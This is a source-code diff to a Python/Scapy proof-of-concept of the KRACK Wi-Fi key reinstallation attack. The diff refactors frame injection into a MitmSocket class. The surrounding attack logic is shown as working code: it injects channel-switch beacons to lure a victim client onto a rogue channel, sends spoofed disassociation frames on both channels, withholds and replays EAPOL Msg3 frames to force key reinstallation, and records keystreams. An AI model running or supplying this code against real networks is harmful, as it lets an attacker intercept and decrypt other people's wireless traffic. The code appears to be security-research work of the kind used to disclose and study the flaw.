@@ -9,11 +9,15 @@ from wpaspy import Ctrl
 # TODO:
 # - Option to continously send CSA beacon frames on the real channel
 #
-# - If EAPOL-Msg4 has been received on the real channel, the attack has failed
-# - Delete created *sta virtual interfaces
 # - Victim client does not go through all stages. ClientState.GotMitm not set currently.
+# - If EAPOL-Msg4 has been received on the real channel, the attack has failed
+# - Detect when all frames are sent on the real channel, and if so, deauthenticate
+#
+# - Test that we indeed have two different Msg3's, and not just retransmissions
+#
+# - Do not forward control frames?
+# - Delete created *sta virtual interfaces
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
-# - Detect when all frames are sent on the reall channel, and if so, deauthenticate
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
@@ -45,43 +49,46 @@ def log(level, msg, color=None, showtime=True):
 
 #### Packet Processing Functions ####
 
+class MitmSocket(L2Socket):
+	def send(self, p):
+		# Hack: set the More Data flag so we can detect injected frames
+		p[Dot11].FCfield |= 0x20
+		L2Socket.send(self, RadioTap()/p)
+		log(DEBUG, "Injected frame: %s" % dot11_to_str(p))
+
+	def _strip_fcs(self, p):
+		# Scapy can't handle FCS field automatically
+		if p[RadioTap].present & 2 != 0:
+			rawframe = str(p[RadioTap])
+			pos = 8
+			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
+		
+			# If the TSFT field is present, it must be 8-bytes aligned
+			if p[RadioTap].present & 1 != 0:
+				pos += (8 - (pos % 8))
+				pos += 8
+
+			# Remove FCS if present
+			if ord(rawframe[pos]) & 0x10 != 0:
+				return Dot11(str(p[Dot11])[:-4])
+
+		return p[Dot11]
+
+	def recv(self):
+		p = L2Socket.recv(self)
+		if p == None or not Dot11 in p: return None
+		# Hack: ignore frames that we just injected and are echoed back by the kernel
+		if p[Dot11].FCfield & 0x20 != 0:
+			log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
+			return None
+		else:
+			log(ALL, "Received frame: %s" % dot11_to_str(p))
+		# Strip the FCS if present, and drop the RadioTap header
+		return self._strip_fcs(p)
+
+
 def xorstr(lhs, rhs):
 	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
-
-def strip_fcs(p):
-	# Scapy can't handle FCS field automatically
-	if p[RadioTap].present & 2 != 0:
-		rawframe = str(p[RadioTap])
-		pos = 8
-		while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
-		
-		# If the TSFT field is present, it must be 8-bytes aligned
-		if p[RadioTap].present & 1 != 0:
-			pos += (8 - (pos % 8))
-			pos += 8
-
-		# Remove FCS if present
-		if ord(rawframe[pos]) & 0x10 != 0:
-			return Dot11(str(p[Dot11])[:-4])
-
-	return p[Dot11]
-
-def recv_dot11(socket):
-	p = socket.recv()
-	if p == None or not Dot11 in p: return None
-	# Hack: ignore frames that we just injected and are echoed back by the kernel
-	if p[Dot11].FCfield & 0x20 != 0:
-		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
-		return None
-	else:
-		log(ALL, "Received frame: %s" % dot11_to_str(p))
-	return strip_fcs(p)
-
-def send_dot11(socket, p):
-	# Hack: set the More Data flag so we can detect injected frames
-	p[Dot11].FCfield |= 0x20
-	socket.send(RadioTap()/p)
-	log(DEBUG, "Injected frame: %s" % dot11_to_str(p))
 
 def dot11_get_seqnum(p):
 	return p[Dot11].SC >> 4
@@ -365,7 +372,7 @@ class KRAckAttack():
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
 		if p is None or len(p) < 1: return
-		self.beacon = strip_fcs(p[0])
+		self.beacon = p[0]
 		self.apmac = self.beacon.addr2
 
 	def send_csa_beacon(self, numbeacons=1):
@@ -375,17 +382,17 @@ class KRAckAttack():
 			# FIXME: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
 			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(self.beacon, newchannel, 2)
-			send_dot11(self.sock_real, csabeacon)
+			self.sock_real.send(csabeacon)
 
 			csabeacon = append_csa(self.beacon, newchannel, 1)
-			send_dot11(self.sock_real, csabeacon)
+			self.sock_real.send(csabeacon)
 
 		log(STATUS, "Injected %d CSA beacons (new channel %d)" % (numbeacons, newchannel), color="green")
 
 	def send_disas(self, macaddr):
 		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
-		send_dot11(self.sock_rogue, p)
-		send_dot11(self.sock_real, p)
+		self.sock_rogue.send(p)
+		self.sock_real.send(p)
 		log(STATUS, "Injected Disassociation to %s on both channels" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
@@ -423,7 +430,7 @@ class KRAckAttack():
 		return True
 
 	def handle_rx_realchan(self):
-		p = recv_dot11(self.sock_real)
+		p = self.sock_real.recv()
 		if p == None: return
 
 		# 1. Handle frames sent TO the real AP
@@ -487,7 +494,7 @@ class KRAckAttack():
 					# FIXME: This may cause a timeout on the client side???
 					if len(client.msg3s) >= 2:
 						log(STATUS, "Got 2nd EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
-						for p in client.msg3s: send_dot11(self.sock_rogue, p)
+						for p in client.msg3s: self.sock_rogue.send(p)
 						client.msg3s = []
 						# TODO: Should extra stuff be done here?	
 						client.attack_start()
@@ -496,10 +503,10 @@ class KRAckAttack():
 
 				elif Dot11Deauth in p:
 					del self.clients[p.addr1]
-					send_dot11(self.sock_rogue, p)
+					self.sock_rogue.send(p)
 
 				else:
-					send_dot11(self.sock_rogue, p)
+					self.sock_rogue.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -507,7 +514,7 @@ class KRAckAttack():
 
 
 	def handle_rx_roguechan(self):
-		p = recv_dot11(self.sock_rogue)
+		p = self.sock_rogue.recv()
 		if p == None: return
 
 		# 1. Handle frames sent BY the rouge AP
@@ -568,7 +575,7 @@ class KRAckAttack():
 							client.update_state(ClientState.Success_Reinstalled)
 	
 							# TODO: Test this case
-							send_dot11(self.sock_real, client.msg4)
+							self.sock_real.send(client.msg4)
 
 						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 						else:
@@ -587,7 +594,7 @@ class KRAckAttack():
 					client.save_iv_keystream(iv, keystream)
 
 				if will_forward:
-					send_dot11(self.sock_real, p)
+					self.sock_real.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -598,8 +605,10 @@ class KRAckAttack():
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
-		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
-		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
+		#self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
+		#self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
+		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real)
+		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
 
 		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
 		self.find_beacon(self.ssid)
